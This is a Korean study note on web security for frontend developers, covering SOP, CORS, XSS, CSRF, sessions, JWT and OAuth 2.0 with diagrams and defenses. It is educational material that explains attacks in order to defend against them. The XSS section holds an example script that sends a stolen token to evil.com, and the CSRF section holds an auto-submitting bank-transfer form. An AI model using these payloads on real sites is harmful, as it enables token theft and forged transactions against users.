# 7주차 — Web Security / 인증

> **키워드** SOP(예규) · CORS · XSS · CSRF · 인증/인가 · 쿠키/세션 · JWT · OAuth
> **FE 심화** Preflight · Cookie 옵션 · Token 저장 방식 · OAuth Redirect

---

## 0. 개요

8개 키워드는 따로 노는 게 아니라 세 묶음으로 엮여 있음.

| 묶음 | 키워드 | 한 줄 요약 |
|---|---|---|
| 브라우저 규칙 | SOP, CORS | 다른 출처의 응답은 기본 차단(SOP), 서버가 허락하면 예외(CORS) |
| 공격 | XSS, CSRF | XSS는 남의 사이트에서 **내 스크립트를 실행**, CSRF는 남의 쿠키로 **내 요청을 실행** |
| 인증 수단 | 쿠키/세션, JWT, OAuth | "너 누구야?"를 매 요청마다 증명하는 방법들 |

연결 고리
- SOP는 **응답 읽기**를 막고 **요청 전송**은 안 막음 → 그 틈이 CSRF
- XSS 스크립트는 **같은 출처**로 실행됨 → SOP로 못 막음
- 쿠키는 **브라우저가 자동으로 붙임** → 편하지만 CSRF의 원인
- 토큰을 JS가 읽을 수 있는 곳에 두면 **XSS로 탈취**되고, 쿠키에 두면 **CSRF 대비**가 필요함 → 저장 위치는 트레이드오프

---

## 1. SOP (Same-Origin Policy, 동일 출처 정책)

**정의**: 브라우저가 "지금 페이지와 출처가 같은 곳의 리소스만 JS가 읽게" 제한하는 보안 규칙

**Origin의 구성**
```text
  https://   www.example.com   :443   /posts/7?sort=new
  --------   ---------------   ----   -----------------
  Scheme     Host              Port   Path + Query
  |_______________________________|   (not used for origin)
          Origin = Scheme + Host + Port
```
- 셋 중 하나라도 다르면 Cross-Origin
- Port 생략 시 http는 80, https는 443

**출처 비교 예시** 

| URL | 결과 | 이유 |
|---|---|---|
| `https://www.example.com/notice` | ✓ Same | Path만 다름 |
| `https://www.example.com:443` | ✓ Same | https 기본 포트가 443 |
| `http://www.example.com` | ✗ Cross | Scheme 다름 |
| `https://api.example.com` | ✗ Cross | Host 다름 (서브도메인도 다른 출처) |
| `https://www.example.com:8080` | ✗ Cross | Port 다름 (localhost:3000 → localhost:8080도 해당) |

**SOP가 막는 것 vs 허용하는 것**

| ✗ 막는 것: 다른 출처의 "데이터 읽기" | ✓ 허용하는 것: "삽입·요청 보내기" |
|---|---|
| `fetch`/XHR 응답을 JS로 읽기 (CORS 허용 없으면 차단) | `<img>`, `<script src>`, `<link rel="stylesheet">`, `<video>` |
| 다른 출처 iframe의 DOM 접근 | `<form>` 제출, 링크 이동 (요청은 나감) |
| 다른 출처의 쿠키·localStorage·IndexedDB 접근 | → 이 "요청은 나간다"는 틈을 노리는 게 **CSRF** |

- SOP는 서버가 아니라 **브라우저**가 지키는 규칙 → Postman, curl, 서버 간 통신엔 적용 안 됨
- 이 제한을 **서버가 허락해서 풀어주는 장치가 CORS**

**헷갈리는 포인트: Same-Origin vs Same-Site**

| | 기준 | `app.example.com` ↔ `api.example.com` |
|---|---|---|
| Same-Origin | scheme + host + port 전부 | ✗ 다름 |
| Same-Site | scheme + 등록 가능한 도메인(eTLD+1, `example.com`) | ✓ 같음 |

- SOP·CORS는 **Origin** 기준, 쿠키의 SameSite 속성은 **Site** 기준
- 이 차이 때문에 "CORS는 걸리는데 쿠키는 붙는" 상황이 생김

---

## 2. CORS (Cross-Origin Resource Sharing)

**정의**: SOP의 예외를 **서버가 응답 헤더로 허락**해주는 메커니즘. 검사는 서버가 아니라 브라우저가 함

### 2-1. Simple Request

**조건** (전부 만족해야 함)
- 메서드가 `GET` / `HEAD` / `POST` 중 하나
- 기본 헤더만 사용
- `Content-Type`이 `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data` 중 하나

```text
JS (app.example.com)                      Browser                          API Server
          |                                  |                                  |
          |--- (1) fetch: api.example.com -->|                                  |
          |                                  | adds Origin header               |
          |                                  |--------- (2) GET /posts -------->|
          |                                  |                                  | processes normally
          |                                  |<.... (3) 200 + ACAO header ......|
          |                                  | (4) Origin == ACAO ?             |
          |<-- (5a) match: pass response ----|                                  |
          |<.. (5b) mismatch: CORS error ....|                                  |
```
1. JS(app.example.com)가 `fetch("https://api.example.com/posts")` 호출
2. 브라우저가 `Origin: https://app.example.com`을 자동으로 붙여 GET 전송
3. 서버는 요청을 정상 처리하고, 응답에 `Access-Control-Allow-Origin`(ACAO)을 실어 보냄
4. 브라우저가 요청의 Origin과 응답의 ACAO를 비교
5. 일치하면 JS에 응답 전달 / 헤더가 없거나 다르면 JS엔 CORS error

**핵심**: CORS 에러가 나도 **요청은 이미 서버에 도착해서 처리된 상태**임. 브라우저가 결과를 JS에 안 넘겨줄 뿐임

### 2-2. Preflight Request `FE 심화`

```text
JS (app.example.com)                      Browser                          API Server
          |                                  |                                  |
          |-- (1) fetch PUT + JSON + auth -->|                                  |
          |                                  | not simple -> preflight          |
          |                                  |------ (2) OPTIONS /posts/1 ----->|
          |                                  |<.. (3) 204 + Allow-* headers ....|
          |                                  | allowed -> continue              |
          |                                  |-------- (4) PUT /posts/1 ------->|
          |                                  |<........ (5) 200 + ACAO .........|
          |<------ (6) pass response --------|                                  |
```
1. JS가 `PUT` + `Content-Type: application/json` + `Authorization` 헤더로 요청 → Simple 조건 위반
2. 브라우저가 본 요청 전에 `OPTIONS`를 먼저 보냄
   ```http
   OPTIONS /posts/1
   Origin: https://app.example.com
   Access-Control-Request-Method: PUT
   Access-Control-Request-Headers: content-type, authorization
   ```
3. 서버가 `204 No Content`로 허용 범위를 응답
   ```http
   HTTP/1.1 204 No Content
   Access-Control-Allow-Origin: https://app.example.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: content-type, authorization
   Access-Control-Max-Age: 600
   ```
4. 허용 범위가 확인되면 본 요청 `PUT` 전송
5. `200 OK` + ACAO 응답
6. JS에 전달

**Simple Request와의 차이**: 3번에서 허용이 안 나오면 **본 요청은 아예 안 나감** → 서버 데이터가 바뀌기 **전에** 막을 수 있음

**언제 뜨나**: Simple 조건을 하나라도 어기면 발생. 실무에서 거의 항상 뜨는 이유는 아래와 같음
- `Content-Type: application/json` (JSON을 보내는 순간)
- `Authorization` 헤더 (토큰을 붙이는 순간)
- `PUT`, `PATCH`, `DELETE`

**왜 있나**: Simple Request는 서버가 일단 처리해버리지만, Preflight는 데이터가 바뀌기 전에 서버 허락을 먼저 받음. CORS 개념을 모르는 예전 서버들이 예상 못 한 요청으로 망가지지 않게 하려는 장치

**`Access-Control-Max-Age`**: Preflight 결과를 캐시하는 시간(초). 안 주면 매 요청마다 OPTIONS가 한 번씩 더 나감 → 네트워크 탭에 요청이 2배로 찍히는 원인

### 2-3. 쿠키까지 보내려면 (credentials)

```js
fetch(url, { credentials: 'include' })   // axios: withCredentials: true
```

이 경우 서버 응답 조건이 더 엄격해짐
- `Access-Control-Allow-Credentials: true` 필수
- `Access-Control-Allow-Origin: *` **불가** → 정확한 origin을 적어야 함
- `Allow-Headers`, `Allow-Methods`도 `*` 불가

### 2-4. FE 입장에서 CORS 에러 해결

| 방법 | 원리 | 비고 |
|---|---|---|
| 서버에서 허용 Origin 설정 | 정석 | 결국 이게 근본 해결 |
| 개발 서버 Proxy (Vite `server.proxy` 등) | 브라우저 → 같은 출처(dev 서버) → API 서버. 마지막 구간은 서버 간 통신이라 SOP 없음 | **개발 환경 한정** |
| 브라우저 확장으로 CORS 끄기 | 내 브라우저만 검사를 안 함 | 사용자 환경에선 그대로 터짐 → 해결 아님 |

**헷갈리는 포인트**: CORS는 보안을 **추가하는** 기능이 아니라 SOP를 **풀어주는** 장치임. CORS 설정을 잘해도 CSRF는 못 막음 (Simple Request는 어차피 서버에 도착하므로)

---

## 3. XSS (Cross-Site Scripting)

**정의**: 공격자가 심은 스크립트가 **신뢰받는 사이트의 코드인 척** 피해자 브라우저에서 실행되는 공격

**Stored XSS 흐름**
```text
 Attacker                   site.com Server               Victim Browser                   evil.com
     |                             |                             |                             |
     |---- (1) POST /comments ---->|                             |                             |
     |                             | <script>...</script>        |                             |
     |                             | (2) saved as-is             |                             |
     |                             |<---- (3) GET /posts/1 ------|                             |
     |                             |.... (4) HTML + <script> ...>|                             |
     |                             |                             | (5) runs as site.com        |
     |                             |                             |--- (6) GET /s?t=<token> --->|
     |                             |                             |                             | (7) impersonate victim
```
1. 공격자가 댓글에 스크립트를 넣어 작성
   ```html
   좋은 글이네요 <script>fetch('https://evil.com/s?t=' + localStorage.token)</script>
   ```
2. 서버가 검증·이스케이프 없이 그대로 DB에 저장
3. 피해자가 게시글을 열람
4. 응답 HTML에 그 스크립트가 그대로 포함됨
5. 브라우저는 "site.com이 준 코드"로 보고 실행. 같은 출처 권한으로 돌기 때문에 SOP로 못 막음
6. 토큰이 URL에 실려 evil.com으로 전송됨 (요청 **전송**은 SOP가 안 막음)
7. 공격자가 훔친 토큰으로 피해자 행세

**XSS 유형**

| 유형 | 스크립트가 어디서 오나 | 예시 |
|---|---|---|
| Stored | 서버 DB에 저장됨 → 보는 사람 모두 피해 | 게시글·댓글 |
| Reflected | URL 파라미터가 응답에 그대로 반사됨 | `search?q=<script>…` 링크로 유도 |
| DOM-based | 서버를 안 거치고 **프론트 JS**가 직접 DOM에 넣음 | `el.innerHTML = location.hash` |

- DOM-based는 서버가 아무리 잘 막아도 **프론트 코드에서 생기는 XSS** → FE가 직접 책임지는 영역

**방어**
1. **출력 이스케이프**: `<`를 `&lt;`로 바꿔 출력. React는 `{변수}`로 렌더링하면 자동 이스케이프
2. **위험 API 피하기**: `dangerouslySetInnerHTML`, `innerHTML`, `href={userInput}`(`javascript:` 스킴). 꼭 HTML을 넣어야 하면 DOMPurify로 Sanitize
3. **CSP**: `Content-Security-Policy: script-src 'self'` → 인라인·외부 스크립트 실행 자체를 차단
4. **HttpOnly 쿠키**: 토큰 **탈취**(6번)는 막음. 단, XSS 스크립트가 그 페이지 안에서 API를 대신 호출하는 건 못 막음 → "HttpOnly면 XSS 안전"은 반만 맞는 말

---

## 4. CSRF (Cross-Site Request Forgery)

**정의**: 로그인된 사용자의 브라우저가 **자동으로 붙이는 쿠키**를 이용해, 사용자가 의도하지 않은 요청을 보내게 만드는 공격

```text
  bank.com                       Victim Browser                       evil.com
      |                                 |                                 |
      |<------- (1) POST /login --------|                                 |
      |.. (2) Set-Cookie: SID=abc123 ..>|                                 |
      |                                 |---- (3) GET /event (click) ---->|
      |                                 |<.. (4) trap page: auto form ....|
      |                                 | auto-attach Cookie: SID=abc123  |
      |<----- (5) POST /transfer -------|                                 |
      | (6) valid session -> transfer   |                                 |
```
1. 피해자가 bank.com에 로그인
2. `Set-Cookie: SID=abc123` → 로그인 유지 상태
3. 로그인을 유지한 채로 evil.com의 이벤트 링크 클릭
4. 함정 페이지 응답. 안에 숨은 form이 자동 제출됨
   ```html
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="1000000">
   </form>
   <script>form.submit()</script>
   ```
5. 브라우저가 bank.com으로 POST를 보내면서 bank.com 쿠키(`SID=abc123`)를 **사용자가 보낸 적도 없는데 자동 첨부**
6. 은행 서버는 유효한 세션이므로 본인 요청으로 판단 → 이체 실행

**성립 조건 3가지** (하나라도 깨지면 공격 불가)
1. 인증을 **쿠키**로 함 (브라우저가 자동 첨부)
2. 요청 파라미터를 공격자가 **예측할 수 있음**
3. 서버가 "진짜 사용자가 우리 사이트에서 보낸 건지" **추가 확인을 안 함**

**방어**: 각각 위 조건을 하나씩 깨는 방식

| 방어 | 깨는 조건 | 원리 |
|---|---|---|
| **SameSite 쿠키** (Lax/Strict) | 조건 1 | 다른 사이트에서 시작된 POST엔 쿠키가 안 붙음 → 5번에 SID가 안 실림 |
| **CSRF 토큰** | 조건 2 | 서버가 폼마다 랜덤 값을 발급, 요청에 같이 보내야 통과. evil.com은 SOP 때문에 이 값을 못 읽음 |
| **Origin/Referer 검증, 중요 작업 재인증** | 조건 3 | 요청이 어디서 왔는지 확인, 송금·비번 변경은 다시 인증 |
| **쿠키 대신 Authorization 헤더** | 조건 1 자체가 없음 | 브라우저가 자동으로 안 붙임 |

### XSS vs CSRF 비교

| | XSS | CSRF |
|---|---|---|
| 공격자가 하는 일 | 피해 사이트에 **스크립트를 심음** | 다른 사이트에서 **요청을 위조** |
| 악용하는 신뢰 | 사용자가 **사이트를** 믿음 | 사이트가 **사용자 브라우저를** 믿음 |
| 응답을 읽을 수 있나 | ✓ (같은 출처로 실행되므로) | ✗ (SOP 때문에 보내기만 가능) |
| 대표 방어 | 이스케이프, CSP | SameSite, CSRF 토큰 |

- XSS가 뚫리면 CSRF 토큰도 그냥 읽힘 → **XSS 방어가 CSRF 방어보다 우선**

---

## 5. 인증 / 인가

| | 인증 (Authentication) | 인가 (Authorization) |
|---|---|---|
| 질문 | 너 **누구**야? | 너 이거 **해도 돼**? |
| 순서 | 먼저 | 인증 다음 |
| 실패 시 | **401** Unauthorized | **403** Forbidden |
| 예시 | 로그인, 토큰 검증 | 관리자만 게시글 삭제 가능 |

**헷갈리는 포인트**: 401은 이름이 "Unauthorized"지만 의미는 사실상 **Unauthenticated**(인증 안 됨). 로그인은 됐는데 권한이 없으면 403

**FE에서의 처리**
- 401 → 토큰 재발급 시도 또는 로그인 페이지로 이동
- 403 → "권한 없음" 안내
- 둘을 같은 에러로 처리하면 UX가 꼬임

---

## 6. 쿠키 / 세션

- **쿠키**: 서버가 `Set-Cookie`로 내려주면 브라우저가 저장하고, 이후 같은 도메인 요청마다 **자동으로** 붙여 보내는 작은 데이터
- **세션**: 로그인 상태를 **서버가** 저장하고, 클라이언트엔 세션 ID만 주는 방식
- 둘은 대체 관계가 아님. "세션 ID를 **쿠키에 담아** 주고받는" 게 일반적인 조합

**쿠키 + 세션 로그인 흐름** (상태를 서버가 기억 → Stateful)
```text
  Browser                          Server                         Session Store
     |                                |                                 |
     |--- (1) POST /login {id, pw} -->|                                 |
     |                                |------ (2) save SID=a1b2c3 ----->|
     |<. (3) Set-Cookie: SID=a1b2c3 ..|                                 |
     | HttpOnly; Secure; SameSite=Lax |                                 |
     |--- (4) GET /mypage (Cookie) -->|                                 |
     |                                |-------- (5) lookup SID -------->|
     |                                |<... {userId: 7, role: USER} ....|
     |                                | (6) authn + authz               |
     |<.... (7) 200 mypage data ......|                                 |
================================ logout =================================
     |                                |------ (8) delete session ------>|
```
1. `POST /login { id, pw }`
2. 서버가 세션 저장소(서버 메모리 / Redis)에 `SID=a1b2c3 → { userId: 7, role: "USER" }` 저장
3. 응답: `Set-Cookie: SID=a1b2c3; HttpOnly; Secure; SameSite=Lax`
4. 이후 요청마다 `Cookie: SID=a1b2c3` 자동 첨부
5. 서버가 SID로 세션 조회
6. 누군지 확인(인증) + 권한 확인(인가)
7. 응답
8. 로그아웃·강제 로그아웃은 세션 삭제로 처리 → 해당 SID 즉시 무효

- **장점**: 서버가 세션을 쥐고 있어 언제든 강제 만료 가능. 쿠키엔 의미 없는 ID만 담김 (사용자 정보는 서버에 있음)
- **단점**: 요청마다 저장소 조회 필요. 서버가 여러 대면 세션 공유 필요 (Sticky Session 또는 Redis 같은 공용 저장소)

### 쿠키 옵션 `FE 심화`

```http
Set-Cookie: refreshToken=abc; Domain=example.com; Path=/auth; Max-Age=1209600; Secure; HttpOnly; SameSite=Strict
```

| 속성 | 역할 | 메모 |
|---|---|---|
| `Domain` | 어느 도메인에 보낼지 | 생략 시 발급한 호스트만 (서브도메인 X) |
| `Path` | 어느 경로에 보낼지 | RT 쿠키를 `Path=/auth`로 두면 다른 API엔 안 붙음 |
| `Expires` / `Max-Age` | 만료 | 둘 다 없으면 **세션 쿠키** (브라우저를 닫으면 삭제) |
| `Secure` | HTTPS에서만 전송 | Chrome·Firefox는 `http://localhost`를 예외로 허용 |
| `HttpOnly` | **JS 접근 차단** (`document.cookie`로 못 읽음) | XSS 탈취 방어 |
| `SameSite` | **다른 사이트발 요청에 보낼지** | CSRF 방어 (아래) |

**SameSite 3단계**

| 값 | 다른 사이트에서 시작된 요청 | 체감 |
|---|---|---|
| `Strict` | 전부 안 보냄 | 외부 링크로 들어오면 로그인이 풀린 것처럼 보임 |
| `Lax` | **최상위 이동(링크 클릭) GET만** 보냄. POST·iframe·fetch는 X | 대부분의 기본 선택 |
| `None` | 다 보냄 | **`Secure` 필수** |

- SameSite를 안 적으면 일부 브라우저(Chrome 등)는 `Lax`로 취급함
- 단, 이때는 발급 2분 이내 POST엔 쿠키를 붙여주는 완화 버전이라 명시적으로 적는 게 안전함

---

## 7. JWT (JSON Web Token)

**정의**: 사용자 정보(클레임)를 담고 **서명**으로 위변조를 막은 토큰. 서버가 상태를 안 들고 있어도 검증 가능 (Stateless)

**구조**: 점(.)으로 구분된 3개의 Base64URL 문자열 `Header.Payload.Signature`

실제 토큰 예시 (jwt.io에 넣으면 그대로 디코딩됨)
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI3Iiwicm9sZSI6IlVTRVIiLCJpYXQiOjE3OTExOTA4MDAsImV4cCI6MTc5MTE5MTcwMH0.pYlYKdgsOpz68oPEV2OvXxyIPBCmOqXbdx4rJfVukYY
```
```text
[Header]     eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
             -> { "alg": "HS256", "typ": "JWT" }
     .
[Payload]    eyJzdWIiOiI3Iiwicm9sZSI6IlVTRVIiLCJpYXQiOjE3OTExOTA4MDAsImV4cCI6MTc5MTE5MTcwMH0
             -> { "sub": "7", "role": "USER", "iat": 1791190800, "exp": 1791191700 }
     .
[Signature]  pYlYKdgsOpz68oPEV2OvXxyIPBCmOqXbdx4rJfVukYY
             -> HMACSHA256(base64Url(header) + "." + base64Url(payload), secret)
```

| 부분 | 내용 |
|---|---|
| Header | 토큰 타입 + 서명 알고리즘 |
| Payload | 담고 싶은 정보(클레임). `sub` 사용자 식별자, `role` 커스텀 클레임, `iat` 발급 시각, `exp` 만료 시각(15분 뒤) |
| Signature | 서버만 아는 secret으로 만든 위변조 검증용 서명 |

**서버의 검증 과정** (DB 조회 없이 계산만으로 확인 → Stateless의 근거)
```text
  received token:  header.payload  +  signature
                         |
                         v
  HMACSHA256(header.payload, server secret)  ->  signature'
                         |
                         v
  signature' == signature ?
     yes + exp not passed  ->  pass
     no                    ->  401 (payload tampered)
```

**주의**
- **인코딩 ≠ 암호화**: payload는 누구나 디코딩 가능 → 비밀번호·개인정보 넣으면 안 됨. JWT가 보장하는 건 "**안 바뀌었다**"(무결성)이지 "**못 본다**"(기밀성)가 아님
- **HS256 vs RS256**: HS256은 같은 secret으로 서명·검증하는 대칭키 방식 → 서버가 하나일 때 간단. RS256은 개인키로 서명, 공개키로 검증하는 비대칭 방식 → 검증 서버가 많을 때 유리

**JWT 인증 흐름 (Access Token + Refresh Token)**
```text
 Frontend                          API Server                          RT Store
     |                                  |                                  |
     |---- (1) POST /login {id, pw} --->|                                  |
     |                                  |---------- (2) save RT ---------->|
     |<. (3) AT in body, RT in cookie ..|                                  |
     | AT: memory / RT: HttpOnly        |                                  |
     |--- (4) GET /posts (Bearer AT) -->|                                  |
     |                                  | (5) verify signature + exp       |
     |<.......... (6) 200 OK ...........|                                  |
========================= 15 min later: AT expired =========================
     |-- (7) GET /posts (expired AT) -->|                                  |
     |<..... (8) 401 Unauthorized ......|                                  |
     | RT cookie auto-attached          |                                  |
     |----- (9) POST /auth/refresh ---->|                                  |
     |                                  |----- (10) check RT + rotate ---->|
     |<.... (11) new AT (+ new RT) .....|                                  |
     | (12) retry (7) via interceptor   |                                  |
```
1. `POST /login { id, pw }`
2. 서버가 Refresh Token을 저장소(DB / Redis)에 저장
3. 응답으로 두 토큰을 따로 발급
   ```http
   HTTP/1.1 200 OK
   Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict; Path=/auth   (RT, 2주)

   { "accessToken": "eyJ..." }                                                   (AT, 15분)
   ```
   - 프론트는 AT를 메모리(변수·상태)에, RT는 HttpOnly 쿠키에 보관
4. API 요청 시 `Authorization: Bearer <AT>`
5. 서버는 서명 + exp 검증만 함 (저장소 조회 X)
6. 응답
7. 15분 후 만료된 AT로 요청
8. `401 Unauthorized`
9. `POST /auth/refresh` → RT 쿠키가 자동 첨부됨
10. 서버가 RT 유효성 확인 + 기존 RT 폐기(Rotation)
11. 새 AT(+ 새 RT 쿠키) 발급
12. 실패했던 7번 요청 재시도 (axios interceptor로 자동화)

- **RT를 저장소에 두는 이유**: 순수 JWT는 서버가 "이 토큰 취소"를 못 함 → RT만큼은 서버가 관리해서 로그아웃·강제 만료를 가능하게 함
- **Rotation**: RT를 쓸 때마다 새 RT로 교체. 이미 쓴 RT가 다시 들어오면 탈취로 보고 전부 무효화

### 세션 vs JWT

| | 세션 | JWT |
|---|---|---|
| 상태 저장 | 서버 (Stateful) | 토큰 자체 (Stateless) |
| 검증 비용 | 매 요청 저장소 조회 | 서명 계산만 |
| 서버 여러 대 | 세션 공유 필요 | 키만 공유하면 끝 |
| 강제 로그아웃 | 세션 삭제 시 즉시 | **어려움** (만료 전까진 유효) → 짧은 AT + RT로 보완 |
| 크기 | 쿠키에 ID만 | 클레임을 담은 만큼 커짐 (매 요청 전송) |

**AT/RT를 나누는 이유**
- JWT의 약점이 "발급하면 취소 불가"이기 때문
- AT는 짧게(분 단위) 써서 탈취돼도 금방 무효가 되게 함
- 길게 사는 RT만 서버가 저장소에서 관리 → 로그아웃·강제 만료 가능

### 토큰 저장 방식 `FE 심화`

| 저장 위치 | XSS로 탈취 | CSRF | 새로고침 후 유지 |
|---|---|---|---|
| `localStorage` | **취약** (JS로 바로 읽힘) | 안전 (자동 전송 X) | ✓ |
| `sessionStorage` | **취약** | 안전 | 탭을 닫으면 삭제 |
| 메모리 (변수·상태) | 비교적 안전 (전역 노출 X) | 안전 | ✗ **날아감** |
| `HttpOnly` 쿠키 | 안전 (JS 접근 불가) | **대비 필요** (SameSite 등) | ✓ |

**자주 쓰는 조합**: AT는 **메모리**, RT는 **HttpOnly + Secure + SameSite 쿠키**
- 평소엔 메모리의 AT를 `Authorization` 헤더로 보냄 → CSRF 구조 성립 X
- 새로고침으로 AT가 사라지면 앱 시작 시 `/auth/refresh` 호출 → RT 쿠키 자동 첨부 → 새 AT 발급
- RT는 JS가 못 읽음 → XSS로 탈취 불가

**정리**: 정답이 있는 게 아니라 **어떤 공격을 어디서 막을지 고르는 문제**임. 면접에선 "localStorage 쓰면 안 됨"보다 "XSS 대비가 돼 있으면 쓸 수도 있지만, 이런 이유로 이 조합을 선택함"이 더 좋은 답

---

## 8. OAuth 2.0

**정의**: 사용자가 비밀번호를 넘기지 않고, 제3자 서비스(우리 앱)에게 **자기 정보에 대한 접근 권한을 위임**하는 **인가** 프로토콜

| 역할 | 카카오 로그인에서 |
|---|---|
| Resource Owner | 사용자 |
| Client | **우리 서비스** |
| Authorization Server | 카카오 인증 서버 (`kauth.kakao.com`) |
| Resource Server | 카카오 API 서버 (`kapi.kakao.com`) |

**Authorization Code Grant 흐름** (카카오 로그인 기준)
```text
 Frontend                     Backend                   kauth (Auth)                 kapi (Resource)
     |                           |                            |                             |
========================== front channel: via browser address bar ===========================
     |------------ (1) redirect /oauth/authorize ------------>|                             |
     |                           |                            | (2) login + consent         |
     |<............ (3) 302 callback?code&state ..............|                             |
     | (4) check state           |                            |                             |
============================== back channel: server to server ===============================
     |------ (5) send code ----->|                            |                             |
     |                           |-- (6) POST /oauth/token -->|                             |
     |                           | code + client_secret       |                             |
     |                           |<.... (7) access_token .....|                             |
     |                           |------------------ (8) GET /v2/user/me ------------------>|
     |                           |<.................... (9) user info ......................|
     |<.... (10) our token ......|                            |                             |
```

프론트 채널 (브라우저 주소창을 거침 → 값이 노출될 수 있는 구간)
1. "카카오로 로그인" 클릭 → 인가 서버로 리다이렉트
   ```text
   GET /oauth/authorize?response_type=code&client_id=...&redirect_uri=https://app.com/callback&state=x9f2
   ```
2. 사용자가 카카오에 로그인 + 정보 제공 동의
3. `302 Redirect` → 등록된 redirect_uri로 복귀
   ```text
   https://app.com/callback?code=AUTH_CODE&state=x9f2
   ```
4. 프론트가 state가 1번에서 보낸 값과 같은지 확인 (다르면 위조 → CSRF 방지)

백 채널 (서버 ↔ 서버 직접 통신 → 브라우저에 노출 X, client_secret은 여기서만 사용)

5. 프론트가 `POST /auth/kakao { code }`로 code를 우리 백엔드에 전달
6. 백엔드가 `POST /oauth/token` 호출 (grant_type=authorization_code, code, client_id, client_secret, redirect_uri)
7. access_token, refresh_token 수신 (OIDC 사용 시 id_token 포함)
8. `GET /v2/user/me` + `Authorization: Bearer access_token`으로 사용자 정보 요청
9. 사용자 정보(회원번호, 닉네임 등) 수신
10. 가입/로그인 처리 후 **우리 서비스 토큰**(JWT·세션) 발급

- **code를 한 번 더 토큰으로 바꾸는 이유**: code는 주소창(프론트 채널)을 지나 히스토리·로그에 남을 수 있음 → code 단독으론 쓸모없게 만들고, client_secret을 가진 우리 서버만 토큰으로 교환하도록 설계 (code도 1회용 + 짧은 유효기간)
- **카카오가 준 access_token은 '카카오 API 출입증'일 뿐임**. 우리 서비스의 로그인 상태는 10번에서 따로 만드는 것

**헷갈리는 포인트: OAuth는 원래 "로그인"이 아님**
- OAuth는 "카카오 API를 호출할 권한"(인가)을 받는 것
- 이를 로그인(인증)처럼 쓰려고 **사용자 신원 정보(`id_token`)를 표준화한 것이 OIDC(OpenID Connect)**
- "소셜 로그인 = OAuth"라고만 답하면 반쪽짜리 답

### OAuth Redirect: 프론트가 할 일 `FE 심화`

1. **인가 URL 생성 후 이동**: `client_id`, `redirect_uri`, `response_type=code`, `scope`, `state`
2. **`state` 생성·보관**: 랜덤 값을 만들어 `sessionStorage`에 저장 → 돌아왔을 때 비교 (CSRF 방지)
3. **콜백 라우트** (`/oauth/callback`): `URLSearchParams`로 `code`, `state` 추출
4. **`code`를 백엔드로 전달** 후 `history.replaceState`로 주소창에서 `code` 제거
5. `redirect_uri`는 개발자 콘솔에 등록한 값과 **문자 하나까지** 같아야 함 (http/https, 끝의 `/`까지)

```js
// /oauth/callback
const sent = useRef(false);
useEffect(() => {
  if (sent.current) return;            // StrictMode 중복 실행 방지
  sent.current = true;
  const params = new URLSearchParams(location.search);
  const code = params.get('code');
  const state = params.get('state');
  if (state !== sessionStorage.getItem('oauth_state')) return; // 위조
  api.post('/auth/kakao', { code });
  history.replaceState(null, '', '/oauth/callback');            // 주소창에서 code 제거
}, []);
```

**실수 포인트**
- React StrictMode(개발 모드)는 `useEffect`를 두 번 실행함
- → `code`를 백엔드에 두 번 보내게 됨 → `code`는 **1회용**이라 두 번째 요청은 실패
- → ref로 중복 실행 방지 필요

### Implicit Grant를 안 쓰는 이유 / PKCE

- **Implicit**: `code` 없이 토큰을 URL로 바로 받는 방식. 토큰이 주소창·히스토리에 노출됨 → 현재 권장 X (OAuth 2.1 초안에선 제거)
- **PKCE**: `client_secret`을 안전하게 둘 곳이 없는 앱(SPA, 모바일)을 위한 보완책
  ```text
  (1) client: code_verifier (random)  ->  code_challenge = SHA256(code_verifier)
  (2) authorize request  + code_challenge
  (3) token request      + code_verifier
  (4) server: SHA256(code_verifier) == code_challenge ?  -> issue token
  ```
  - 중간에 `code`를 가로채도 `code_verifier`가 없으면 토큰 교환 불가
- 위 흐름은 카카오 문서 기준이라 PKCE 없이 `client_secret`(백엔드 보관)으로 보호함. 제공자마다 PKCE 지원 여부가 다르므로 사용 시 문서 확인 필요
